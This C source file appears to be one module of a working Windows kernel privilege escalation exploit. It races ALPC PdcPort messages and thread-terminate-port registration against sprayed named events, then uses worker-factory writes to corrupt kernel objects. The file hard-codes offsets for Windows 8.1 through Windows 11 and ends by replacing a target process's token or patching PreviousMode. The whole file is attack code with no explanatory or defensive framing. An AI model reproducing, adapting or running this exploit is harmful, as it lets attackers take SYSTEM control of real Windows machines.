#include "PRace.h"
#include "Commons.h"
#include <Psapi.h>
#include <sddl.h>
#include <tlhelp32.h>

#include "..\\IORiongCommons\\exploit.h"

CRITICAL_SECTION cs;

HANDLE hMainThread = 0;

volatile BOOL bExploited = FALSE;
volatile BOOL bStop		 = FALSE;

extern ULONG uSystem;
extern BOOL  bWin11;
extern BOOL	 bServer;

extern INTERNAL_PROCESS_OFFSETS ipo;

volatile ULONG	 uTimerResolution = 0;
volatile ULONG	 uOldResolution   = 0;

volatile BOOL	 bRace			  = FALSE;
volatile BOOL	 bInJob			  = FALSE;

volatile PBYTE	 pElevationThread = 0;

BOOL   bProcList   = FALSE;							// TRUE if there is a list of processes
DWORD  dTargetPid  = 0;								// PID of the target process

HANDLE hBaseDir;
NtQueryLicenseValueT			NtQueryLicenseValue_			= 0;
BaseGetNamedObjectDirectoryT	BaseGetNamedObjectDirectory_	= 0;
NtAlpcConnectPortT				NtAlpcConnectPort_				= 0;
NtAlpcSendWaitReceivePortT		NtAlpcSendWaitReceivePort_		= 0;
NtRegisterThreadTerminatePortT	NtRegisterThreadTerminatePort_	= 0;

volatile HANDLE hPort = 0;

VOID TryChangeToken()
{
	ULONG_PTR uKernel = GetKernelValue((ULONG_PTR)pElevationThread);
	if (uKernel != ERROR_READ_KERNEL)
	{
		ULONG i = 0;
		
		bInJob = TRUE;
		bRace  = FALSE;
		
		SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);

		bExploited = ChangeToken(dTargetPid, (ULONG_PTR)pElevationThread);
				
		SetKernelValue((ULONG_PTR)pElevationThread + ipo.PreviousMode, (GetKernelValue((ULONG_PTR)pElevationThread + ipo.PreviousMode) | 1));

		bInJob = FALSE;
	}
}

volatile SIZE_T ulSendSize = 0;
HANDLE ConnectPdcPort2()
{
	NTSTATUS ntStatus = -1;
	HANDLE hPdcPort = 0;

	if (uSystem == WIN_81_X64)
	{
		ulSendSize = 0x40;
	}
	else if (uSystem > WIN_81_X64 && uSystem <= WIN_10_1511_X64)
	{
		ulSendSize = 0xF0;
	}
	else if (uSystem < WIN_10_1803_X64)
	{
		ulSendSize = 0x300;
	}
	else if (uSystem == WIN_10_1803_X64)
	{
		ulSendSize = 0x318;
	}
	else if (uSystem > WIN_10_1803_X64)
	{
		ulSendSize = 0x300;
	}
	
	if (ulSendSize != 0)
	{
		UNICODE_STRING usPortName = {0};

		ALPC_PORT_ATTRIBUTES PortAttributes;
		SECURITY_QUALITY_OF_SERVICE SecurityQos;
		BYTE AlpcMessage[0x1000];
		PALPC_PORT_MESSAGE pAlpcMessage = (PALPC_PORT_MESSAGE)&AlpcMessage;

		RtlSecureZeroMemory(&AlpcMessage, 0x1000);
		RtlSecureZeroMemory(&PortAttributes, sizeof(PortAttributes));
		RtlSecureZeroMemory(&SecurityQos, sizeof(SecurityQos));

		PortAttributes.Flags = ALPC_PORTFLG_ALLOW_LPC_REQUESTS;
		PortAttributes.MaxMessageLength = ulSendSize;
		PortAttributes.MaxPoolUsage		= 0x20000;
		PortAttributes.SecurityQos		= SecurityQos;

		//pAlpcMessage->ClientId.UniqueProcess = GetCurrentProcess();
		//pAlpcMessage->ClientId.UniqueThread  = GetCurrentThread();
		pAlpcMessage->u1.s1.DataLength  = (USHORT)ulSendSize - 0x28;
		pAlpcMessage->u1.s1.TotalLength = (USHORT)ulSendSize;
		
		*(PULONG_PTR)(AlpcMessage + 0x30) = 0x0000000300000011;
		*(PVOID*)(AlpcMessage + 0x38)	  = pAlpcMessage;
	
		RtlInitUnicodeString(&usPortName, L"\\PdcPort");
		
		ntStatus = NtAlpcConnectPort_(
			(PHANDLE)&hPdcPort,						
			&usPortName,							
			NULL,									
			&PortAttributes,						
			0,						//ALPC_PORTFLG_ALLOW_DUP_OBJECT | ALPC_PORTFLG_ALLOW_LPC_REQUESTS,
			0,										
			pAlpcMessage,							
			(PSIZE_T)&ulSendSize,					
			0,										
			0,										
			0);	
	}
	
	return hPdcPort;
}

volatile LONG lThreadsCount = 0;

DWORD CALLBACK RegisterTerminateThread(LPVOID lpParameter)
{
	while (hPort == 0)
	{}

	NtRegisterThreadTerminatePort_(hPort);
	InterlockedIncrement(&lThreadsCount);

	while (!bRace)
	{}

	return 0;
}

PDC_STRUCT  pdcEventName = { 0 };
PDC_STRUCT2 pdc2		 = { 0 };

__declspec(align(256)) PVOID pPtr[0x200];
__declspec(align(256)) PVOID pp[0x200];			// ????

HANDLE hRaceThread1;
HANDLE hRaceThread2;

volatile PBYTE pIoBuffers	   = 0;
volatile PBYTE pIoBuffersCount = 0;
volatile PBYTE pFakeIoBuf	   = 0;
volatile PBYTE pFactoryBuf	   = 0;

HMODULE hNtDll = 0;

volatile HANDLE	hFactory	= 0;
volatile PBYTE	pFactoryObj = 0;
volatile ULONG	uStage		= 0;

HANDLE hFactories[0x1000];

NtSetInformationWorkerFactoryT NtSetInformationWorkerFactory_ = 0;

BOOL CreateFactory_10()
{
	ULONG_PTR i	= 0;
	HANDLE hRead;
	HANDLE hWrite;

	pFactoryBuf = (PBYTE)VirtualAlloc((LPVOID)0x0000010000000001, 0x10000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (pFactoryBuf == 0)
	{
		return FALSE;
	}

	memset(hFactories, 0, sizeof(hFactories));

	NtCreateWorkerFactoryT NtCreateWorkerFactory_		= (NtCreateWorkerFactoryT)GetProcAddress(hNtDll, "NtCreateWorkerFactory");
	NtShutdownWorkerFactoryT NtShutdownWorkerFactory_	= (NtShutdownWorkerFactoryT)GetProcAddress(hNtDll, "NtShutdownWorkerFactory");

	HANDLE hPort = CreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, 0, 0);
	
	NtSetInformationWorkerFactory_ = (NtSetInformationWorkerFactoryT)GetProcAddress(hNtDll, "NtSetInformationWorkerFactory");

	if (CreatePipe(&hRead, &hWrite, 0, -1))
	{
		BYTE bp[0x300];
		memset(bp, 0, sizeof(bp));

		for (i = 0; i < 0x10000; ++i)
		{
			IO_STATUS_BLOCK isb;
			NTSTATUS ntStatus = NtFsControlFile((HANDLE)hWrite, 0, 0, 0, &isb, 0x119FF8 + 0x1000000, bp, 0x100 + MyRand()%0x200, 0, 0);	
		}

		CloseHandle(hRead);
		CloseHandle(hWrite);
	}
	
	if (NT_SUCCESS(NtCreateWorkerFactory_((PHANDLE)&hFactory, GENERIC_ALL, NULL, hPort, GetCurrentProcess(), 0, 0, 0, 0, 0)))
	{
		NtShutdownWorkerFactory_(hFactory, &i);

		pFactoryObj = (PBYTE)FindObjectByHandle(GetCurrentProcessId(), hFactory, FALSE);
		//int3
	}

	return (pFactoryObj != 0 && pFactoryBuf != 0);
}

BOOL CreateFactory_11()
{
	BOOLEAN bRes = FALSE;
	ULONG_PTR i = 0;
	PBYTE pStartAddr = (PBYTE)((ULONG_PTR)0xFFFFFFFF + 0x10000);
	
	if (CreateFactory_10())
	{
		while (pFakeIoBuf == 0 && (ULONG_PTR)pStartAddr > 0x10001)
		{
			pStartAddr -= 0x10000;
			pFakeIoBuf = (PBYTE)VirtualAlloc((LPVOID)pStartAddr, 0x2000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
		}

		if (pFakeIoBuf == 0)
		{
			return FALSE;
		}

		for (i = 0; i < 0x10000 / sizeof(PVOID); i += sizeof(PVOID))
		{
			*(PBYTE*)(pFactoryBuf + i) = pIoBuffers - 0x2C;
		}

		bRes = TRUE;
	}

	return bRes;
}

VOID FlushAllBuffers()
{
	if (bWin11)
	{
		pdc2.u1 = 0;
		pdc2.u2 = 0;
		pdc2.uPdcIndex = 0x0000000400000004;
		pdc2.p1 = 0;
		pdc2.p2 = &pp;

		pp[0x6B8 / sizeof(PVOID)] = &pp[0x700 / sizeof(PVOID)];
		pp[0x6C0 / sizeof(PVOID)] = (PVOID)0x400;
		pp[0x6C8 / sizeof(PVOID)] = (uStage == 0) ? (PBYTE)pFactoryObj + 0x0D : (PBYTE)pFactoryObj + 0x11; //(PBYTE)pFactoryObj + 0x0D;
	}
	else
	{
		if (uSystem == WIN_81_X64)
		{
			pdc2.u1 = 0;
			pdc2.u2 = 0;
			pdc2.uPdcIndex = 0x0000000000000002;
			pdc2.p1 = &pp;

			*(PDWORD)((PBYTE)&pdc2 + 0x6C) = 3;

			pp[0xF8  / sizeof(PVOID)] = &pp[0x700 / sizeof(PVOID)];
			pp[0x100 / sizeof(PVOID)] = (PVOID)0x400;
			pp[0x108 / sizeof(PVOID)] = (uStage == 0) ? (PBYTE)pFactoryObj + 0x0D : (PBYTE)pFactoryObj + 0x11; //(PVOID)(pElevationThread + 0x232 - 4 - 1);
		}
		else if (uSystem > WIN_81_X64&& uSystem <= WIN_10_1511_X64)
		{
			pdc2.u1 = 0;
			pdc2.u2 = 0;
			pdc2.uPdcIndex = 0x0000000000000002;
			pdc2.p1 = &pp;

			*(PDWORD)((PBYTE)&pdc2 + 0x9C) = 4;

			pp[0x258 / sizeof(PVOID)] = &pp[0x700 / sizeof(PVOID)];
			pp[0x260 / sizeof(PVOID)] = (PVOID)0x400;
			pp[0x268 / sizeof(PVOID)] = (uStage == 0) ? (PBYTE)pFactoryObj + 0x0D : (PBYTE)pFactoryObj + 0x11; //(PVOID)(pElevationThread + 0x232 - 4 - 1);
		}
		else if (uSystem < WIN_10_1803_X64)
		{
			pdc2.u1 = 0;
			pdc2.u2 = 0;
			pdc2.uPdcIndex = 0x0000000000000004;
			pdc2.p1 = &pp;

			pp[0x678 / sizeof(PVOID)] = &pp[0x700 / sizeof(PVOID)];
			pp[0x680 / sizeof(PVOID)] = (PVOID)0x400;
			pp[0x688 / sizeof(PVOID)] = (uStage == 0) ? (PBYTE)pFactoryObj + 0x0D : (PBYTE)pFactoryObj + 0x11; //(PVOID)(pElevationThread + 0x232 - 4 - 1);
		}
		else if (uSystem == WIN_10_1803_X64)
		{
			pdc2.u1 = 0;
			pdc2.u2 = 0;
			pdc2.uPdcIndex = 0x0000000000000004;
			pdc2.p1 = &pp;

			pp[0x6A8 / sizeof(PVOID)] = &pp[0x700 / sizeof(PVOID)];
			pp[0x6B0 / sizeof(PVOID)] = (PVOID)0x400;
			pp[0x6B8 / sizeof(PVOID)] = (uStage == 0) ? (PBYTE)pFactoryObj + 0x0D : (PBYTE)pFactoryObj + 0x11; //(PVOID)(pElevationThread + 0x232 - 4 - 1);
		}
		else
		{
			pdc2.u1 = 0;
			pdc2.u2 = 0;
			pdc2.uPdcIndex = 0x0000000400000004;
			pdc2.p1 = 0;
			pdc2.p2 = &pp;

			pp[0x6B8 / sizeof(PVOID)] = &pp[0x700 / sizeof(PVOID)];
			pp[0x6C0 / sizeof(PVOID)] = (PVOID)0x400;
			pp[0x6C8 / sizeof(PVOID)] = (uStage == 0) ? (PBYTE)pFactoryObj + 0x0D : (PBYTE)pFactoryObj + 0x11; //(PVOID)(pElevationThread + 0x232 - 4 - 2);
		}
	}
}

__declspec(noinline) VOID CALLBACK SendPortThreadApc(LPVOID lpArgToCompletionRoutine, DWORD dwTimerLowValue, DWORD dwTimerHighValue)
{
	if (bRace && !bExploited)
	{
		BYTE bSend[0x1000];
		PPORT_MESSAGE pmSend = (PPORT_MESSAGE)bSend;

		memset(pmSend, 0, sizeof(PORT_MESSAGE));

		pmSend->u1.s1.DataLength  = (USHORT)ulSendSize - 0x28;
		pmSend->u1.s1.TotalLength = (USHORT)ulSendSize;
		pmSend->MessageId		  = (uSystem <= WIN_10_1511_X64) ? 4 : 7;
		
		FlushAllBuffers();

		NtAlpcSendWaitReceivePort_(hPort, ALPC_MSGFLG_WOW64_CALL /*| ALPC_MSGFLG_LPC_MODE*/, (PPORT_MESSAGE)bSend, 0, 0, 0, 0, 0);
		if (*(PULONG_PTR)((PBYTE)&pdc2 + 0x40) != 0)
		{
			++uStage;
			
			if (uStage >= 2 && !bExploited)
			{
				ULONG i = 0;

				bInJob = TRUE;
				//if (hFactory && pFactoryBuf) int3
				
				if (bWin11)
				{
					for (i = 0; i < 0x10000 / sizeof(PVOID); i += sizeof(PVOID))
					{
						*(PBYTE*)(pFactoryBuf + i) = pIoBuffers - 0x2C;
					}
					NtSetInformationWorkerFactory_(hFactory, 8, (PVOID)&pFakeIoBuf, sizeof(DWORD));

					for (i = 0; i < 0x10000 / sizeof(PVOID); i += sizeof(PVOID))
					{
						*(PBYTE*)(pFactoryBuf + i) = pIoBuffersCount - 0x2C;
					}
					i = 1;
					NtSetInformationWorkerFactory_(hFactory, 8, (PVOID)&i, sizeof(DWORD));

					bExploited = ExploitIO(dTargetPid, pFakeIoBuf);
				}
				else
				{
					for (i = 0; i < 0x10000 / sizeof(PVOID); i += sizeof(PVOID))
					{
						*(PBYTE*)(pFactoryBuf + i) = pElevationThread + 0x232 - 0x2C;
					}
					i = 0x100;
					//int3
					NtSetInformationWorkerFactory_(hFactory, 8, (PVOID)&i, sizeof(DWORD));

					TryChangeToken();
				}

				for (i = 0; i < 0x10000 / sizeof(PVOID); i += sizeof(PVOID))
				{
					*(PBYTE*)(pFactoryBuf + i) = pFactoryObj - 0x28 - 0x2C;
				}
				i = 2;
				NtSetInformationWorkerFactory_(hFactory, 8, (PVOID)&i, sizeof(DWORD));

				for (i = 0; i < 0x10000 / sizeof(PVOID); i += sizeof(PVOID))
				{
					*(PBYTE*)(pFactoryBuf + i) = pFactoryObj - 0x30 - 0x2C;
				}
				i = 0x7FFF0000;
				NtSetInformationWorkerFactory_(hFactory, 8, (PVOID)&i, sizeof(DWORD));
				//int3
				NtClose(hFactory);

				bInJob = FALSE;
			}
		}
	}
}

DWORD CALLBACK SendPortThread(LPVOID lpParameter)
{
	while (hPort == 0)
	{}

	InterlockedIncrement(&lThreadsCount);

	while (!bRace)
	{}

	while (bRace && !bExploited)
	{
		SendPortThreadApc(0, 0, 0);
	}

	return 0;
}

#define _MAX_EVENTS 0x8000
volatile BYTE   bEventName[0x40];
volatile HANDLE hEvents[_MAX_EVENTS];
volatile ULONG	uEvents = 0;

BOOL CraftPdc(ULONG uNum, BOOL bCloseLast, BOOL bLic)
{
	BOOL bRes = FALSE;
	ULONG i	  = 0;
	UNICODE_STRING ustr  = {0};
	OBJECT_ATTRIBUTES oa = {0};

	if (!bRace || bExploited)
	{
		return bRes;
	}
	
	if (bLic)
	{
		for (i = 0; i < uNum; ++i)
		{
			NtQueryLicenseValue_(&ustr, 0, 0, 0, (PULONG_PTR)-1);
		}

		return TRUE;
	}

	EnterCriticalSection(&cs);
	{
		NTSTATUS ntStatus;

		ustr.Buffer = (PWSTR)&pdcEventName;
		ustr.Length = 0x40;
		ustr.MaximumLength = 0x40;
		InitializeObjectAttributes(&oa, &ustr, 0, hBaseDir, NULL);

		for (i = 0; i < uNum; ++i)
		{
			pdcEventName.p1		= 0;
			pdcEventName.p2		= 0;
			pdcEventName.p3		= 0;
			pdcEventName.p4		= 0;
			pdcEventName.p5		= &pdc2;
			pdcEventName.p6		= 0;
			pdcEventName.p7		= 0;
			pdcEventName.wNull	= 0;
			++pdcEventName.wIndex;

			if (uEvents < _MAX_EVENTS)
			{
				ntStatus = NtCreateEvent((PHANDLE)&hEvents[uEvents++], EVENT_ALL_ACCESS, &oa, 1, 0);

				if (NT_SUCCESS(ntStatus))
				{
					bRes = TRUE;
				}
				else if (ntStatus == STATUS_OBJECT_PATH_NOT_FOUND)
				{
					bRes = TRUE;

					break;
				}
				else
				{
					bRes = FALSE;

					break;
				}
			}
			else
			{
				bRes = FALSE;

				break;
			}
		}

		NtQueryLicenseValue_(&ustr, 0, 0, 0, (PULONG_PTR)-1);

		if (bCloseLast && uEvents != 0)
		{
			NtClose(hEvents[--uEvents]);			// ????
		}
	}
	LeaveCriticalSection(&cs);

	return bRes;
}

__declspec(noinline) VOID CALLBACK CraftPdcApc(LPVOID lpArgToCompletionRoutine, DWORD dwTimerLowValue, DWORD dwTimerHighValue)
{
	CraftPdc(8, TRUE, FALSE);
}

__declspec(noinline) VOID CALLBACK CraftPdcApc2(LPVOID lpArgToCompletionRoutine, DWORD dwTimerLowValue, DWORD dwTimerHighValue)
{
	CraftPdc(8, TRUE, TRUE);
}

DWORD CALLBACK CraftPdcThread(LPVOID lpParameter)
{
	HANDLE hTimer = CreateWaitableTimerW(0, TRUE, 0);
	LARGE_INTEGER liDueTime;

	if (hTimer != NULL)
	{
		liDueTime.QuadPart = -1;

		SetWaitableTimer(hTimer, &liDueTime, (LONG)1, (PTIMERAPCROUTINE)CraftPdcApc2, (LPVOID)0, 0);
	}

	while (TRUE)
	{
		if (!SwitchToThread())
		{
			SleepEx(0, TRUE);
		}

		if (bExploited || bStop)
		{
			break;
		}

		CraftPdc(8, TRUE, TRUE);
	}

	return 0;
}

DWORD CALLBACK MainExpThread(LPVOID lpParameter)
{
	ULONG_PTR i = 0;
	DWORD_PTR j = 0;
	HANDLE hCraftPdcThread;

	HANDLE hTimer = CreateWaitableTimerW(0, TRUE, 0);
	LARGE_INTEGER liDueTime;

	DWORD_PTR dwOldMask = SetThreadAffinityMask(GetCurrentThread(), (1 << 0));
	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
	Sleep(0);

	bRace = FALSE;
	
	while (dwOldMask != 0)
	{
		hCraftPdcThread = CreateThread(0, 0, CraftPdcThread, 0, 0, 0);
		if (hCraftPdcThread != NULL)
		{
			SetThreadPriority(hCraftPdcThread, THREAD_PRIORITY_TIME_CRITICAL);
			CloseHandle(hCraftPdcThread);
		}
		else
		{
			break;
		}

		dwOldMask >>= 1;
	}
	
	/*
	for (i = 1; i < 64; ++i)
	{
		hCraftPdcThread = CreateThread(0, 0, CraftPdcThread, 0, 0, 0);
		if (hCraftPdcThread != NULL)
		{
			dwOldMask = SetThreadAffinityMask(hCraftPdcThread, (DWORD_PTR)1 << i);
			if (dwOldMask != 0)
			{
				SetThreadPriority(hCraftPdcThread, 1);
			}
			else
			{
				TerminateThread(hCraftPdcThread, 0);
			}

			CloseHandle(hCraftPdcThread);
		}
	}
	*/

	if (PrepareIO((PVOID*)&pIoBuffers, (PVOID*)&pIoBuffersCount))
	{
		bWin11 = TRUE;
	}
	
	if (bWin11)
	{
		if (!CreateFactory_11())
		{
			return FALSE;
		}
	}
	else
	{
		if (!CreateFactory_10())
		{
			return FALSE;
		}
	}
	
	if (hTimer != NULL)
	{
		liDueTime.QuadPart = -1;

		SetWaitableTimer(hTimer, &liDueTime, (LONG)1, (PTIMERAPCROUTINE)CraftPdcApc, (LPVOID)0, 0);
	}

	while (!bStop && !bExploited)
	{
		hPort = ConnectPdcPort2();
		if (hPort == 0)
		{
			break;
		}
		
		lThreadsCount = 0;

		hRaceThread1 = CreateThread(0, 0, RegisterTerminateThread, 0, CREATE_SUSPENDED, 0);
		hRaceThread2 = CreateThread(0, 0, SendPortThread, 0, CREATE_SUSPENDED, 0);

		if (hRaceThread1 == 0 || hRaceThread2 == 0)
		{
			NtClose(hPort);

			if (hRaceThread1 != 0) TerminateThread(hRaceThread1, 0);
			if (hRaceThread2 != 0) TerminateThread(hRaceThread2, 0);

			break;
		}

		memset(&pdc2, 0, sizeof(pdc2));
		memset(&pp, 0, sizeof(pp));
		//int3
		if (!bWin11)
		{
			pElevationThread = (PBYTE)FindObjectByHandle(GetCurrentProcessId(), hRaceThread2, FALSE);
		}

		FlushAllBuffers();

		EnterCriticalSection(&cs);
		{
			pdcEventName.p1		= 0;
			pdcEventName.p2		= 0;
			pdcEventName.p3		= 0;
			pdcEventName.p4		= 0;
			pdcEventName.p5		= &pdc2;
			pdcEventName.p6		= 0;
			pdcEventName.p7		= 0;
			pdcEventName.wIndex = 0;
			pdcEventName.wNull	= 0;
		}
		LeaveCriticalSection(&cs);

		SetThreadAffinityMask(hRaceThread1, 1 << 0);
		SetThreadAffinityMask(hRaceThread2, 1 << 0);
		SetThreadPriority(hRaceThread1, 1);
		SetThreadPriority(hRaceThread2, 1);

		ResumeThread(hRaceThread1);
		ResumeThread(hRaceThread2);

		while (lThreadsCount != 2)
		{
			Sleep(1);
		}

		j = 0;
		uEvents = 0;
		bRace = TRUE;

		WaitForSingleObject(hRaceThread1, INFINITE);
		while (!bExploited && uEvents < _MAX_EVENTS)
		{
			if (!CraftPdc(8, TRUE, FALSE))		//(uSystem > WIN_10_1903_X64)))	// ????
			{
				break;
			}

			if (!SwitchToThread())
			{
				SleepEx(0, TRUE);
			}
		}
		
		bRace = FALSE;
		
		if (WaitForSingleObjectEx(hRaceThread2, 100, TRUE) != WAIT_OBJECT_0)
		{
			TerminateThread(hRaceThread2, 0);
		}

		if (uEvents != 0)
		{
			for (i = 0; i < uEvents; ++i)
			{
				NtClose(hEvents[i]);
			}
		}

		NtClose(hRaceThread1);
		NtClose(hRaceThread2);
		NtClose(hPort);
	}

	return bExploited;
}

BOOL __stdcall EscalatePrivileges(DWORD dPid)
{
	ULONG i = 0;
	ULONG j = 0;
	ULONG k = 0;
	
	BOOL bKeyIndexFound = FALSE;
	
	hNtDll = LoadLibraryW(L"ntdll.dll");
	if (hNtDll == NULL)
	{
		return FALSE;
	}

	if (!InitInternal())
	{
		if (!InitInternal2())
		{
			//int3
			return FALSE;
		}
	}

	if (uSystem != WIN_81_X64 && uSystem < WIN_10_1607_X64)
	{
		return FALSE;
	}

	bWin11 = FALSE;

	dTargetPid = (dPid != 0) ? dPid : GetCurrentProcessId();

	InitializeCriticalSection(&cs);

	NtAlpcConnectPort_				= (NtAlpcConnectPortT)GetProcAddress(hNtDll, "NtAlpcConnectPort");
	NtQueryLicenseValue_			= (NtQueryLicenseValueT)GetProcAddress(hNtDll, "NtQueryLicenseValue");
	NtAlpcSendWaitReceivePort_		= (NtAlpcSendWaitReceivePortT)GetProcAddress(hNtDll, "NtAlpcSendWaitReceivePort");
	NtRegisterThreadTerminatePort_  = (NtRegisterThreadTerminatePortT)GetProcAddress(hNtDll, "NtRegisterThreadTerminatePort");

	{
		HMODULE hKernel = GetModuleHandle(L"KERNELBASE.dll");
		if (hKernel != 0)
		{
			BaseGetNamedObjectDirectory_ = (BaseGetNamedObjectDirectoryT)GetProcAddress(hKernel, "BaseGetNamedObjectDirectory");
		}

		if (BaseGetNamedObjectDirectory_ == 0)
		{
			hKernel = GetModuleHandle(L"KERNEL32.dll");
			if (hKernel != 0)
			{
				BaseGetNamedObjectDirectory_ = (BaseGetNamedObjectDirectoryT)GetProcAddress(hKernel, "BaseGetNamedObjectDirectory");
			}
		}

		if (BaseGetNamedObjectDirectory_ != 0)
		{
			BaseGetNamedObjectDirectory_(&hBaseDir);
		}
	}

#ifdef _CHANGE_TIMER_RES
	{
		ULONG MinimumResolution;
		ULONG MaximumResolution;
		ULONG CurrentResolution;

		if (NT_SUCCESS(NtQueryTimerResolution(&MinimumResolution, &MaximumResolution, &CurrentResolution)))
		{
			uOldResolution = CurrentResolution;

			if (NT_SUCCESS(NtSetTimerResolution(MaximumResolution + 1, TRUE, &CurrentResolution)))
			{
				uTimerResolution = MaximumResolution + 1;
			}
			else
			{
				uTimerResolution = 1;
			}
		}
	}
#else
	uTimerResolution = 1;
#endif


	hMainThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MainExpThread, (LPVOID)0, CREATE_SUSPENDED, 0);
	if (hMainThread != NULL)
	{
		UINT  uOldErrorMode  = SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX | SEM_NOALIGNMENTFAULTEXCEPT | SEM_NOOPENFILEERRORBOX);
		DWORD dPriorityClass = GetPriorityClass(GetCurrentProcess());
		
		ResumeThread(hMainThread);
		WaitForSingleObject(hMainThread, _EXP_TIMEOUT*1000);
		bStop = TRUE;
		Sleep(1000);

		if (bInJob) Sleep(1000);
				
		SetErrorMode(uOldErrorMode);
		if (uOldResolution != 0)
		{
			NtSetTimerResolution(uOldResolution, TRUE, (PULONG)&uOldResolution);
		}
	}
	else
	{
		return FALSE;
	}

	return bExploited;
}
